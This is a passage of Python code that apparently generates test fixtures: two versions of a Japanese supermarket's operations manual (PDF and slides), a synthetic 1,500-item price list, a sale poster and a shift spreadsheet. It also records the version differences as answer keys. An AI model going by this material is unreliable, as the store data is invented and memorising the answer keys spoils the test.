            ('steps', ['「頭を守って、棚から離れてください」と大きな声で呼びかける。', '揺れが収まったら、火を消し、ガスの元栓を閉める。', 'けが人がいないかを確かめ、通路に落ちた物を取り除く。', '震度5弱以上のときは、営業をいったん止め、店長が本部の災害対策室（電話 03-5555-0191）へ状況を報告する。',
                       '建物の安全が確かめられるまで、お客様を駐車場の避難場所へ案内する。'])]),
        ('火災のとき', [
            ('steps', ['「火事だ」と大きな声で知らせ、火災報知器のボタンを押す。', '119番へ通報する（店の名前・住所・燃えている場所を伝える）。', '消火器で初期消火をする。炎が天井に届いたら、消火をやめて避難する。', 'お客様を、火元から遠い出口へ案内する。エレベーターは使わない。'])]),
        ('防災用品の点検', [
            ('table', [['品目', '置く数', '点検'], ['消火器', '売場 20m ごとに1本', '月1回'], ['AED', '1台（サービスカウンター）', '毎日（ランプの色）'], ['非常灯・誘導灯', '全出口', '月1回'],
                       ['非常食・飲料水', S('従業員の3日分', '従業員の3日分と、帰宅できないお客様 50人の1日分'), '年2回（期限の確認）'], ['ヘルメット・懐中電灯', '従業員の人数分', '年2回']]),
            '避難訓練は、年2回（' + S('6月と11月', '5月と11月') + '）行う。']),
        ('万引き・不審者', [
            ('list', ['声かけ（「いらっしゃいませ」「何かお探しですか」）が、いちばんの予防になる。', '万引きを見つけたときは、1人で追いかけない。売場責任者を呼び、店の外へ出てから2人以上で声をかける。', '不審な物を見つけたときは、触らずに店長へ報告する。']),
            ('warn', '強盗にあったときは、抵抗しない。犯人の特徴（身長・服・逃げた方向）を覚え、安全を確かめてから 110番へ通報する。'),
            ('fig', '避難の経路と消火器の位置（店内の図は、各店の事務所に掲示する）', '#ffebee')])])
    apx = ('記録の様式と連絡先', [
        ('記録の様式', [
            ('table', [['様式', '名前', '保存する期間'], ['様式1', '開閉店記録簿', '1年'], ['様式2', '温度記録表', S('1年', '3年')], ['様式3', '期限管理表', '3か月'], ['様式4', '健康チェック表', '1年'], ['様式5', '違算報告書', '3年'], ['様式6', '廃棄報告書', '1年'],
                       ['様式7', 'お客様の声カード', '3年'], ['様式8', '事故報告書', '5年'], ['様式9', '火元点検表', '1年']] + ([['様式10', 'カスタマーハラスメント記録票', '3年']] if six else []))]),
        ('連絡先', [
            ('table', [['部署', '用件', '電話'], ['店舗運営部', 'マニュアル・通達についての問い合わせ', '03-5555-0162（内線 2231）'], ['施設管理課', '冷蔵ケース・空調・建物の故障', '内線 3120'], ['お客様相談室', 'クレーム・健康被害', '0120-555-0138'],
                       ['品質管理課', '異物・表示のまちがい', S('内線 3305', '内線 3310')], ['災害対策室', '地震・火災・台風', '03-5555-0191'], ['警備会社（みなと綜合警備）', '警備システム・集金', '0120-555-0177']]),
            'このマニュアルに書かれていないことは、店長の判断で対応し、あとで店舗運営部へ報告する。'])])
    order = ['open', 'stock', 'temp', 'regi'] + (['eisei', 'nebiki'] if six else ['nebiki', 'eisei']) + ['claim', 'close', 'bousai']
    num = {k: i + 1 for i, k in enumerate(order)}
    def sub(x):
        if isinstance(x, str): return re.sub(r'\{(\w+)\}', lambda m: str(num[m.group(1)]), x)
        if isinstance(x, tuple): return tuple(sub(y) for y in x)
        if isinstance(x, list): return [sub(y) for y in x]
        return x
    chapters = [(num[k], C[k][0], sub(C[k][1])) for k in order] + [('A', apx[0], apx[1])]
    cover = [S('第5版', '第6版'), S('2025年4月1日 施行', '2026年12月1日 施行'), '株式会社かえで台ストア　店舗運営部',
             ('h', 'このマニュアルについて'), 'このマニュアルは、標準店（売場の面積 1,500㎡ 前後、営業時間 9:00〜21:00）の毎日の運営の手順を定める。店長は、新しく入った従業員に、配属から1か月以内にこのマニュアルの内容を説明する。各店の事情で手順を変えるときは、店舗運営部の承認を受ける。',
             ('h', '改定の記録'), ('table', [['版', '施行日', 'おもな改定'], ['第3版', '2022年10月1日', 'レジ袋の有料化に合わせた手順'], ['第4版', '2023年10月1日', 'インボイス制度に合わせたレシートの表示'], ['第5版', '2025年4月1日', 'セルフレジのある店舗の手順']]
                                          + ([['第6版', '2026年12月1日', '温度の記録の回数、値引きを始める時刻、章の順番（衛生管理を第5章へ）、カスタマーハラスメントへの対応（新設）']] if six else [])),
             ('h', '目次')] + [f'第{n}章　{t}' if n != 'A' else f'付録　{t}' for n, t, _ in chapters]
    return cover, chapters


def _m16_head(n, t): return f'第{n}章　{t}' if n != 'A' else f'付録　{t}'


def _m16_flat(blocks, chno, fig):
    """段落の並びを、1行ずつの文字にする（PowerPoint 版と、正解の確認に使う）"""
    o = []
    for b in blocks:
        if isinstance(b, str): o.append(b)
        elif b[0] == 'steps': o += [f'{i + 1}. {s}' for i, s in enumerate(b[1])]
        elif b[0] == 'list': o += ['・' + s for s in b[1]]
        elif b[0] == 'warn': o.append('【注意】' + b[1])
        elif b[0] == 'table': o += ['｜'.join(str(c) for c in r) for r in b[1]]
        elif b[0] == 'fig': fig[0] += 1; o.append(f'図{chno}-{fig[0]}　{b[1]}')
        elif b[0] == 'h': o.append('■ ' + b[1])
    return o


def _m16_lines(v):
    """マニュアル全体を行の並びにしたもの（正解の確認用）"""
    cover, chapters = _m16(v); o = ['店舗運営マニュアル（標準店）'] + _m16_flat(cover, 0, [0])
    for n, t, secs in chapters:
        o.append(_m16_head(n, t)); fig = [0]
        for k, (st, blocks) in enumerate(secs): o.append(f'{n}.{k + 1}　{st}'); o += _m16_flat(blocks, n, fig)
    return o


def _m16_html(v):
    cover, chapters = _m16(v); fig = [0]
    def bl(blocks, chno):
        o = []
        for b in blocks:
            if isinstance(b, str): o.append(f'<p>{esc(b)}</p>')
            elif b[0] == 'steps': o += [f'<p class="st">{i + 1}. {esc(s)}</p>' for i, s in enumerate(b[1])]
            elif b[0] == 'list': o += [f'<p class="li">・{esc(s)}</p>' for s in b[1]]
            elif b[0] == 'warn': o.append(f'<div class="warn"><b>注意</b>　{esc(b[1])}</div>')
            elif b[0] == 'table': o.append(hb([b]))
            elif b[0] == 'fig': fig[0] += 1; o.append(f'<div class="fig" style="background:{b[2]}">図{chno}-{fig[0]}　{esc(b[1])}</div>')
            elif b[0] == 'h': o.append(f'<h2>{esc(b[1])}</h2>')
        return ''.join(o)
    ti = cover.index(('h', '目次'))
    h = ['<div class="cv"><div class="t">店舗運営マニュアル（標準店）</div>' + ''.join(f'<p>{esc(x)}</p>' for x in cover[:3]) + '</div>' + bl(cover[3:ti + 1], 0) + ''.join(f'<p class="toc">{esc(x)}</p>' for x in cover[ti + 1:])]
    for n, t, secs in chapters:
        h.append(f'<div class="pb"></div><h1 class="ch">{esc(_m16_head(n, t))}</h1>'); fig[0] = 0
        for k, (st, blocks) in enumerate(secs):
            pb = blocks and blocks[0] == ('pb',)
            h.append(('<div class="pb"></div>' if pb else '') + f'<h2>{n}.{k + 1}　{esc(st)}</h2>' + bl(blocks, n))
    css = ('h1.ch{font-size:17pt;text-align:left;border-bottom:3px solid #2e7d32;padding-bottom:4px;margin:0 0 12px}h2{font-size:13pt;margin:18px 0 6px;color:#1b5e20}p{margin:0 0 6px}'
           '.st{padding-left:2.2em;text-indent:-2.2em}.li{padding-left:1.1em;text-indent:-1.1em}.warn{border:2px solid #c62828;background:#fdecea;padding:8px 12px;margin:12px 0;break-inside:avoid}.warn b{color:#c62828}'
           '.fig{border:2px solid #607d8b;height:42mm;margin:14px 0;display:flex;align-items:center;justify-content:center;text-align:center;font-size:10.5pt;break-inside:avoid;padding:0 10mm}'
           'tr{break-inside:avoid}td,th{font-size:10.5pt;padding:5px 8px}td:first-child,th:first-child{white-space:nowrap}.cv{text-align:center;margin:8mm 0 6mm}.cv .t{font-size:26pt;font-weight:bold;margin-bottom:5mm}.cv p{text-align:center;font-size:13pt}.toc{margin:0 0 1px 2em;line-height:1.5}')
    return page(''.join(h), css=css, serif=False, size='11.5pt')


def _m16_slides(v):
    cover, chapters = _m16(v); sl = [('店舗運営マニュアル（標準店）' + cover[0], [cover[1], cover[2], '研修用スライド（マニュアルと同じ内容）']), ('改定の記録と目次', _m16_flat(cover[5:], 0, [0]))]
    for n, t, secs in chapters:
        fig = [0]
        for k, (st, blocks) in enumerate(secs):
            lines = _m16_flat(blocks, n, fig); parts = [lines[i:i + 8] for i in range(0, len(lines), 8)] or [['']]
            for j, part in enumerate(parts): sl.append((f'{_m16_head(n, t)}　{n}.{k + 1} {st}' + (f'（{j + 1}/{len(parts)}）' if len(parts) > 1 else ''), part))
    return sl


# 価格表の元：(部門, 件数, 税率, 税抜の幅, 店内コードか, メーカー, 品目「品名|規格,規格…」)
_D16 = [
    ('青果', 120, 8, (78, 598), True, ['JAみなと北', '青葉ファーム', '北浜青果', 'かえで台セレクト'],
     ['キャベツ|1玉,1/2カット,1/4カット', 'レタス|1玉,1/2カット', 'トマト|1個,3個入,4個入', 'ミニトマト|1パック,大パック', 'きゅうり|1本,3本入,5本入', 'なす|1本,3本入,5本入', 'ピーマン|1袋,大袋', 'にんじん|1本,3本入', 'たまねぎ|1個,3個入,大袋', 'じゃがいも|1袋,大袋', 'だいこん|1本,1/2カット',
      'ほうれん草|1束,2束組', '小松菜|1束,2束組', 'ブロッコリー|1株,2株組', '長ねぎ|1本,2本入,3本入', 'ぶなしめじ|1パック,2パック組', 'えのきたけ|1袋,2袋組', 'もやし|200g,大袋 400g', 'バナナ|1房,大房', 'りんご|1個,4個入,1袋', 'みかん|1袋,箱 3kg', 'キウイフルーツ|1個,4個入', 'いちご|1パック,2パック組', 'カット野菜ミックス|1袋,大袋']),
    ('精肉', 90, 8, (158, 1280), True, ['大和ハム', 'みなと畜産', 'かえで台セレクト'],
     [x + '|100g,200g,300g,500g,2パック組' for x in ['国産豚ロース切身', '国産豚こま切れ', '国産豚ひき肉', '国産若鶏もも肉', '国産若鶏むね肉', '国産若鶏ささみ', '牛豚合びき肉', '国産牛切り落とし', '豪州産牛もも焼肉用', '米国産豚肩ロース', 'ロースハム', 'ベーコン', 'あらびきウインナー', '焼豚', '鶏つくね']]),
    ('鮮魚', 80, 8, (198, 1480), True, ['東都水産', '北浜漁協', 'かえで台セレクト'],
     ['刺身盛合せ|3点盛,5点盛,7点盛', 'まぐろ赤身さく|100g,150g,200g', 'サーモン刺身用さく|100g,150g,200g', '塩さば切身|2切入,3切入,4切入', '銀鮭切身|2切入,3切入,4切入', 'ぶり切身|2切入,3切入', 'あじ開き干し|2枚入,3枚入', 'ほっけ開き干し|1枚,2枚入', 'むきえび|100g,200g,大パック 400g', 'ボイルほたて|100g,200g',
      'しらす干し|40g,80g,150g', '辛子明太子|80g,150g', 'たらこ|80g,150g', 'あさり|200g,400g', 'かつおたたき|1さく,2さく組']),
    ('惣菜', 100, 8, (98, 698), True, ['店内調理', 'かえで台キッチン'],
     ['鶏のから揚げ|100g,200g,ファミリーパック', 'ロースとんかつ|1枚,2枚入', 'コロッケ|1個,3個入,5個入', 'メンチカツ|1個,3個入', 'アジフライ|1枚,2枚入,3枚入', 'えび天ぷら|1本,3本入', 'かき揚げ|1個,2個入', '焼き鳥もも串|1本,3本入,5本入', 'ポテトサラダ|100g,200g', 'マカロニサラダ|100g,200g', 'ひじき煮|100g,150g', 'きんぴらごぼう|100g,150g',
      '筑前煮|150g,250g', '幕の内弁当|1個,大盛', 'のり弁当|1個,大盛', 'から揚げ弁当|1個,大盛', '助六寿司|1パック,ファミリーパック', 'にぎり寿司|8貫,10貫,12貫', '鮭おにぎり|1個,2個入', '梅おにぎり|1個,2個入', 'ソース焼きそば|1パック,大盛', 'お好み焼き|1枚,2枚入', '焼き餃子|6個入,12個入', '春巻|2本入,4本入', '麻婆豆腐|200g,350g']),
    ('ベーカリー', 60, 8, (98, 398), True, ['店内ベーカリー', '丸山製粉', '青葉ベーカリー'],
     ['食パン|6枚切,8枚切,4枚切', '山型食パン|6枚切,1斤', 'ロールパン|4個入,6個入', 'クロワッサン|1個,3個入', 'あんパン|1個,4個入', 'クリームパン|1個,4個入', 'メロンパン|1個,3個入', 'カレーパン|1個,2個入', 'バゲット|1本,ハーフ', 'ベーグル|1個,3個入', 'くるみパン|1個,4個入', 'レーズンパン|1個,ハーフ', 'ピザパン|1個,2個入', 'ホットドッグ|1個,2個入', 'シナモンロール|1個,4個入']),
    ('日配', 180, 8, (78, 398), False, ['みなとデイリーフーズ', '北浜食品', '日の出デイリー', 'かえで台セレクト', '三栄フーズ'],
     ['牛乳|200ml,500ml,1000ml', '低脂肪乳|500ml,1000ml', '飲むヨーグルト|180g,900g', 'プレーンヨーグルト|400g,70g×4', 'スライスチーズ|7枚入,12枚入', 'バター|150g,200g', 'マーガリン|160g,300g', '絹豆腐|150g×3,300g,400g', '木綿豆腐|150g×3,300g,400g', '油揚げ|2枚入,5枚入', '納豆|40g×3,45g×4', 'たまご|Mサイズ6個,Mサイズ10個,Lサイズ10個',
      'こんにゃく|250g,400g', 'ちくわ|4本入,5本入', 'かまぼこ|1本,2本組', 'ゆでうどん|1玉,3玉入', '焼きそば麺|3食入,1食', '生ラーメン|2食入,3食入', '白菜キムチ|200g,300g,500g', 'たくあん|1本,ハーフ', 'プリン|1個,3個パック', 'フルーツゼリー|1個,4個パック']),
    ('加工食品', 320, 8, (98, 898), False, ['北浜食品', '三栄フーズ', '共立食品', '丸山フーズ', '旭食品工業', 'かえで台セレクト'],
     ['しょうゆ|500ml,1000ml', '減塩しょうゆ|500ml,750ml', '米みそ|500g,750g', '食塩|500g,1kg', '上白糖|500g,1kg', '穀物酢|500ml,900ml', 'みりん風調味料|500ml,1000ml', '料理酒（加塩）|500ml,1000ml', 'サラダ油|600g,1000g,1350g', 'ごま油|200g,340g', 'オリーブオイル|250g,456g', 'マヨネーズ|350g,450g', 'トマトケチャップ|300g,500g',
      '中濃ソース|300ml,500ml', 'めんつゆ|500ml,1000ml', 'ぽん酢|360ml,600ml', '焼肉のたれ|210g,400g', 'カレールウ 中辛|5皿分,10皿分', 'カレールウ 甘口|5皿分,10皿分', 'シチューの素|5皿分,10皿分', 'レトルトカレー|1食,4食パック', 'パスタ 1.6mm|300g,500g,1kg', 'パスタソース ミート|1人前,2人前', 'そうめん|300g,500g', 'そば 乾麺|200g,400g',
      'カップ麺 しょうゆ|1食,ケース 12食', 'カップ麺 みそ|1食,ケース 12食', '袋麺 しお|1食,5食パック', '小麦粉|500g,1kg', 'パン粉|150g,300g', '片栗粉|200g,400g', 'ツナ缶|70g,70g×3,70g×4', 'さば水煮缶|150g,190g', 'コーン缶|190g,190g×3', 'トマト缶|400g,400g×3', '焼きのり|10枚,全形 30枚', '削りぶし|2.5g×10,80g', 'だしの素|120g,450g',
      '鍋つゆ 寄せ鍋|750g,3〜4人前', '鍋つゆ キムチ|750g,3〜4人前', '精米 こしひかり|2kg,5kg,10kg', '無洗米|2kg,5kg', '切りもち|400g,1kg', 'ふりかけ|28g,50g', 'お茶漬けの素|6袋入,8袋入', 'インスタントみそ汁|8食入,12食入', 'はちみつ|250g,500g', 'いちごジャム|150g,340g']),
    ('菓子', 180, 8, (88, 498), False, ['青葉製菓', '北浜食品', '三栄フーズ', 'かえで台セレクト'],
     ['ミルクチョコレート|1枚,ファミリーパック', 'ビターチョコレート|1枚,ファミリーパック', 'アーモンドチョコ|1箱,大袋', 'ポテトチップス うすしお|60g,150g', 'ポテトチップス のりしお|60g,150g', 'ポテトチップス コンソメ|60g,150g', 'えびせん|80g,160g', 'しょうゆせんべい|10枚入,20枚入', '柿の種|6袋入,9袋入', 'ビスケット|1箱,3箱パック',
      'クッキー詰合せ|12枚入,24枚入', 'バームクーヘン|1個,8個入', 'どら焼き|1個,5個入', '大福|1個,4個入', 'ようかん|1本,ミニ 10本入', 'キャンディ|80g,のど飴 110g', 'グミ ぶどう|50g,100g', 'ガム ミント|9枚,ボトル 150g', 'ミックスナッツ|80g,200g', 'アイスクリーム バニラ|1個,6個入', 'アイスバー ソーダ|1本,8本入', 'カップアイス 抹茶|1個,6個入',
      'ゼリー飲料|180g,180g×6', 'ドライフルーツ|100g,200g', 'ポップコーン|60g,120g']),
    ('飲料', 150, 8, (78, 698), False, ['富士見飲料', 'みなと乳業', '北浜食品', 'かえで台セレクト'],
     ['ミネラルウォーター|500ml,2L,2L×6', '緑茶|500ml,2L,ケース 24本', '麦茶|600ml,2L', 'ほうじ茶|500ml,2L', 'ウーロン茶|500ml,2L', '紅茶 ストレート|500ml,1.5L', 'コーヒー 無糖|185g缶,900ml', 'カフェオレ|240ml,1000ml', 'コーラ|500ml,1.5L', 'サイダー|500ml,1.5L', 'オレンジジュース 100％|200ml,1000ml', 'りんごジュース 100％|200ml,1000ml',
      '野菜ジュース|200ml,900ml', 'スポーツドリンク|500ml,2L', '炭酸水|500ml,1L', '豆乳|200ml,1000ml', 'インスタントコーヒー|80g,200g', 'ティーバッグ 緑茶|20袋,50袋', 'ココア|240g,400g', '甘酒|190g,1000ml']),
    ('酒類', 100, 10, (108, 2480), False, ['旭醸造', '白樺酒造', '北浜ブルワリー', 'かえで台セレクト'],
     ['ビール|350ml,500ml,350ml×6', '発泡酒|350ml,350ml×6', 'チューハイ レモン|350ml,500ml', 'チューハイ グレープフルーツ|350ml,500ml', 'ハイボール|350ml,500ml', '日本酒 純米|720ml,1.8L', '日本酒 本醸造|720ml,1.8L', '芋焼酎|900ml,1.8L', '麦焼酎|900ml,1.8L', '赤ワイン|750ml,ハーフ 375ml', '白ワイン|750ml,ハーフ 375ml',
      'ウイスキー|700ml,ポケット 180ml', '梅酒|720ml,1.8L', '本みりん|500ml,1000ml']),
    ('日用品', 120, 10, (98, 998), False, ['新光ケミカル', '共立ライフ', '三栄ホーム', 'かえで台セレクト'],
     ['ティッシュペーパー|5箱組,3箱組', 'トイレットペーパー|12ロール,18ロール', 'キッチンペーパー|2ロール,4ロール', '食品用ラップ|22cm×50m,30cm×50m', 'アルミホイル|25cm×8m,25cm×15m', 'ポリ袋|45L 10枚,30L 20枚', '台所用洗剤|240ml,詰替 540ml', '洗濯用洗剤|本体 900g,詰替 810g', '柔軟剤|本体 600ml,詰替 480ml', '漂白剤|600ml,1500ml',
      '食器用スポンジ|1個,3個入', 'ハンドソープ|本体 250ml,詰替 450ml', 'シャンプー|本体 480ml,詰替 400ml', 'ボディソープ|本体 500ml,詰替 400ml', '歯みがき|130g,2本組', '歯ブラシ|1本,3本組', 'マスク|7枚入,30枚入,50枚入', '乾電池 単3|4本,10本', '乾電池 単4|4本,10本', '使い捨てカイロ|10個入,30個入', 'ごみ袋 指定|10枚,20枚'])]
# 税率の区分を見直す3品（それぞれ1 SKU だけ）：(部門, メーカー, 品名, 規格, 税抜, 旧税率, 新税率, 理由)
_TAX16 = [('加工食品', '白樺酒造', '料理清酒（食塩無添加）', '500ml', 298, 8, 10, '食塩を加えていない料理酒は酒類'), ('飲料', '北浜ブルワリー', 'ノンアルコールビールテイスト', '350ml', 128, 10, 8, 'アルコール 1％未満は酒類でなく食品'),
          ('菓子', '青葉製菓', '玩具付きチョコレート', '1個', 198, 8, 10, '玩具が主の商品は一体資産に当たらない')]


def _sku16():
    """旧の価格表（1,500 SKU）と新の価格表、変更の内訳を作る。行は {jan, dept, name, spec, price, tax, date, kind}"""
    rnd = random.Random(16160); order = {x[0]: i for i, x in enumerate(_D16)}; mk = {}; used = set(); old = []; spare = {}
    def jan(dept, maker):
        if (dept, maker) not in mk:
            di = order[dept]; mk[(dept, maker)] = (f'2{di % 10}{len(mk) % 100:02d}000' if _D16[di][4] else rnd.choice(['45', '49']) + f'{rnd.randrange(10000, 99999)}')
        while True:
            b = mk[(dept, maker)] + f'{rnd.randrange(100000):05d}'
            if b not in used: break
        used.add(b); return b + str((10 - (sum(int(c) for c in b[0::2]) + 3 * sum(int(c) for c in b[1::2])) % 10) % 10)
    def row(dept, maker, item, sp, lo, hi, tax, price=None):
        p = price or (rnd.randrange(lo, hi) // 10 * 10 + 8)
        return {'jan': jan(dept, maker), 'dept': dept, 'name': f'{maker} {item}', 'spec': sp, 'price': p, 'tax': tax, 'date': datetime.datetime(2025, 4, 1) + datetime.timedelta(days=rnd.randrange(0, 578)),
                'kind': 'PB' if maker.startswith('かえで台') else rnd.choice(['定番'] * 7 + ['季節', '特売対象', '特売対象'])}
    for dept, n, tax, (lo, hi), fresh, makers, items in _D16:
        combos = [(m, it.split('|')[0], sp) for m in makers for it in items for sp in it.split('|')[1].split(',')]; rnd.shuffle(combos)
        forced = [t for t in _TAX16 if t[0] == dept]; k = n - len(forced); assert len(combos) >= k + 6, dept
        old += [row(dept, m, it, sp, lo, hi, tax) for m, it, sp in combos[:k]] + [row(dept, t[1], t[2], t[3], lo, hi, t[5], t[4]) for t in forced]; spare[dept] = combos[k:]
    skey = lambda r: (order[r['dept']], r['jan']); old.sort(key=skey); assert len(old) == 1500 and len({(r['name'], r['spec']) for r in old}) == 1500
    taxj = {r['jan'] for r in old if any(r['name'] == f'{t[1]} {t[2]}' for t in _TAX16)}; assert len(taxj) == 3
    pick = rnd.sample([r['jan'] for r in old if r['jan'] not in taxj], 120 + 15 + 10); up, gone, color = set(pick[:120]), set(pick[120:135]), pick[135:]
    new = []; d1 = datetime.datetime(2026, 12, 1)
    for r in old:
        if r['jan'] in gone: continue
        r = dict(r)
        if r['jan'] in up: r['price'] = max(r['price'] + 10, r['price'] * (100 + rnd.choice([3, 4, 5, 6, 8, 10, 12])) // 100 // 10 * 10 + 8); r['date'] = d1
        if r['jan'] in taxj: r['tax'] = 18 - r['tax']; r['date'] = d1
        new.append(r)
    add = []
    for dept, k in (('加工食品', 6), ('菓子', 4), ('飲料', 4), ('日配', 3), ('酒類', 2), ('日用品', 1)):
        _, _, tax, (lo, hi), _, _, _ = _D16[order[dept]]
        for m, it, sp in spare[dept][:k]: r = row(dept, m, it, sp, lo, hi, tax); r['date'] = d1; r['kind'] = '新商品'; add.append(r)
    new = sorted(new + add, key=skey); assert len(add) == 20 and len(new) == 1505 and len({(r['name'], r['spec']) for r in new}) == 1505
    return old, new, up, gone, {r['jan'] for r in add}, taxj, color


def _incl16(r): return (r['price'] * (108 if r['tax'] == 8 else 110) + 50) // 100


def _book16(path, rows, title, yellow=(), red=()):
    wb = xlsxwriter.Workbook(P(path)); ws = wb.add_worksheet('価格表'); F = wb.add_format
    h = F({'bold': True, 'bg_color': '#D9E1F2', 'border': 1, 'align': 'center'}); n = F({'num_format': '#,##0'}); dt = F({'num_format': 'yyyy/mm/dd'}); sy = F({'bg_color': '#FFFF00'}); nr = F({'num_format': '#,##0', 'font_color': '#FF0000'}); tk = F({'bg_color': '#FCE4D6'})
    ws.write_row(0, 0, ['JANコード', '部門', '品名', '規格', '税抜売価', '税込売価', '税率区分', '売価変更日', '区分'], h)
    for i, r in enumerate(rows):
        x = i + 2; ws.write_string(i + 1, 0, r['jan']); ws.write_string(i + 1, 1, r['dept'])
        if r['jan'] in yellow: ws.write_string(i + 1, 2, r['name'], sy)
        else: ws.write_string(i + 1, 2, r['name'])
        ws.write_string(i + 1, 3, r['spec']); ws.write_number(i + 1, 4, r['price'], nr if r['jan'] in red else n)
        ws.write_formula(i + 1, 5, f'=ROUND(E{x}*{"1.08" if r["tax"] == 8 else "1.1"},0)', n, _incl16(r)); ws.write_string(i + 1, 6, '軽減8%' if r['tax'] == 8 else '標準10%'); ws.write_datetime(i + 1, 7, r['date'], dt)
        if r['kind'] == '特売対象': ws.write_string(i + 1, 8, r['kind'], tk)
        else: ws.write_string(i + 1, 8, r['kind'])
    ws.set_column(0, 0, 16); ws.set_column(1, 1, 10); ws.set_column(2, 2, 40); ws.set_column(3, 3, 16); ws.set_column(4, 8, 12); ws.freeze_panes(1, 0); ws.autofilter(0, 0, len(rows), 8)
    w2 = wb.add_worksheet('凡例'); w2.set_column(0, 0, 14); w2.set_column(1, 1, 70)
    for i, r in enumerate([[title, ''], ['税率区分', '軽減8%＝飲食料品（酒類・外食を除く）。標準10%＝酒類・日用品など。税込売価は、税抜売価に税率を掛けて四捨五入した額（数式）'], ['区分', '定番／PB（自社ブランド）／季節／特売対象（薄い橙色）／新商品'], ['売価変更日', 'その売価になった日'],
                           ['色', '黄色の品名＝棚札の差し替えを先に行う商品。赤い字の税抜売価＝競合店の価格を調べている商品（どちらも、売価は変わらない）']]): w2.write_row(i, 0, r)
    wb.close()


def _pop16(path, v):
    """特売の POP（A4・300dpi＝2480×3508）"""
    W, H = 2480, 3508; im = Image.new('RGB', (W, H), 'white'); dr = ImageDraw.Draw(im); band = (240, 124, 0) if v else (214, 40, 40); price = 218 if v else 198
    def ct(y, s, f, fill): w = dr.textlength(s, font=f); dr.text(((W - w) / 2, y), s, fill=fill, font=f)
    dr.rectangle([0, 0, W, 620], fill=band); ct(130, '週末の特売', font(330, True), 'white'); dr.rectangle([60, 680, W - 60, H - 60], outline=band, width=24)
    ct(800, 'たまご Mサイズ', font(250, True), (20, 20, 20)); ct(1130, '10個入　1パック', font(170), (20, 20, 20))
    f1, f2 = font(880, True), font(330, True); s = str(price); w1, w2, w3 = dr.textlength('¥', font=f2), dr.textlength(s, font=f1), dr.textlength('税抜', font=font(150)); x = (W - w1 - w2 - w3 - 80) / 2
    dr.text((x, 1990), '¥', fill=(214, 40, 40), font=f2); dr.text((x + w1 + 30, 1440), s, fill=(214, 40, 40), font=f1); dr.text((x + w1 + w2 + 80, 2200), '税抜', fill=(20, 20, 20), font=font(150))
    ct(2560, f'（税込 {(price * 108 + 50) // 100}円）', font(210), (20, 20, 20)); ct(2880, 'おひとり様 1パック限り', font(170, True), band)
    dr.text((140, 3180), '※ 12月' + ('6日（日）・7日（月）' if v else '5日（土）・6日（日）') + 'の2日間限り。売り切れの際は、ご容赦ください。', fill=(60, 60, 60), font=font(58))
    dr.text((140, 3290), '※ 写真・イラストはイメージです。', fill=(60, 60, 60), font=font(58)); dr.text((W - 780, 3270), 'かえで台ストア', fill=band, font=font(90, True)); im.save(P(path), dpi=(300, 300))


def _shift16(path, grid, staff, title):
    """シフト表（Excel）。grid[人][日] = (出勤の分, 退勤の分) または None（休み）。時刻は h:mm、休みは2つのセルを結合、勤務の種類で色分け"""
    from xlsxwriter.utility import xl_rowcol_to_cell as rc
    wb = xlsxwriter.Workbook(P(path)); ws = wb.add_worksheet('シフト表'); F = wb.add_format; base = {'border': 1, 'align': 'center', 'valign': 'vcenter'}
    h = F(dict(base, bold=True, bg_color='#E2EFDA')); nm = F(dict(base, align='left')); off = F(dict(base, bg_color='#D9D9D9', font_color='#595959')); tot = F(dict(base, num_format='0.0', bold=True))
    col = {'早': '#DDEBF7', '中': '#FFFFFF', '遅': '#FCE4D6', '短': '#FFF2CC'}; tm = {k: F(dict(base, num_format='h:mm', bg_color=c)) for k, c in col.items()}
    kind = lambda s, e: '短' if e - s <= 300 else '早' if s < 480 else '遅' if s >= 720 else '中'
    ws.merge_range(0, 0, 0, 16, title, F({'bold': True, 'size': 14})); ws.merge_range(1, 0, 2, 0, '氏名', h); ws.merge_range(1, 1, 2, 1, '部門', h); ws.merge_range(1, 16, 2, 16, '週の勤務（時間）', h)
    for k, dn in enumerate(['11/30（月）', '12/1（火）', '12/2（水）', '12/3（木）', '12/4（金）', '12/5（土）', '12/6（日）']): ws.merge_range(1, 2 + 2 * k, 1, 3 + 2 * k, dn, h); ws.write(2, 2 + 2 * k, '出勤', h); ws.write(2, 3 + 2 * k, '退勤', h)
    for i, (name, dept) in enumerate(staff):
        r = 3 + i; ws.write(r, 0, name, nm); ws.write(r, 1, dept, nm)
        for k in range(7):
            c = grid[i][k]
            if c is None: ws.merge_range(r, 2 + 2 * k, r, 3 + 2 * k, '休', off)
            else: f = tm[kind(*c)]; ws.write_number(r, 2 + 2 * k, c[0] / 1440, f); ws.write_number(r, 3 + 2 * k, c[1] / 1440, f)
        ws.write_formula(r, 16, '=(SUM(' + ','.join(rc(r, 3 + 2 * k) for k in range(7)) + ')-SUM(' + ','.join(rc(r, 2 + 2 * k) for k in range(7)) + '))*24', tot, sum(c[1] - c[0] for c in grid[i] if c) / 60)
    r = 4 + len(staff); ws.write(r, 0, '凡例'); ws.write(r, 1, '早番', tm['早']); ws.write(r, 2, '中番', tm['中']); ws.write(r, 3, '遅番', tm['遅']); ws.write(r, 4, '短時間', tm['短']); ws.write(r, 5, '休', off)
    ws.write(r + 1, 0, '※ 勤務の時間には、休憩（6時間を超える勤務は 60分）を含む。変更は、前日の 17時までに店長へ申し出ること。'); ws.set_column(0, 0, 14); ws.set_column(1, 1, 12); ws.set_column(2, 15, 7.5); ws.set_column(16, 16, 16); ws.freeze_panes(3, 2); wb.close()


def r16(d):
    rnd = random.Random(1616)
    # ---- 店舗マニュアル（PDF と PowerPoint）
    mm = {'top': '20mm', 'bottom': '18mm', 'left': '18mm', 'right': '18mm'}
    for v in (5, 6):
        cpdf(f'{d}/店舗運営マニュアル_第{v}版.pdf', _m16_html(v), margin=mm, display_header_footer=True, header_template=hf(f'店舗運営マニュアル（標準店）第{v}版', '社外秘　株式会社かえで台ストア'), footer_template=hf('', '{p} / {n}'))
        mkpptx(f'{d}/店舗運営マニュアル_第{v}版_研修用スライド.pptx', _m16_slides(v))
    la, lb = _m16_lines(5), _m16_lines(6); s5, s6 = _m16_slides(5), _m16_slides(6); assert (len(la), len(lb)) == (252, 273) and _only(la, lb) == (76, 97)
    key(d, '店舗運営マニュアル（PDF）第5版 → 第6版。全体：表紙の版（第5版→第6版）と施行日（2025年4月1日→2026年12月1日）、全ページのヘッダーの版の表記、表紙の「改定の記録」に第6版の行を追加、目次（第5章と第6章の名前が入れ替わる）',
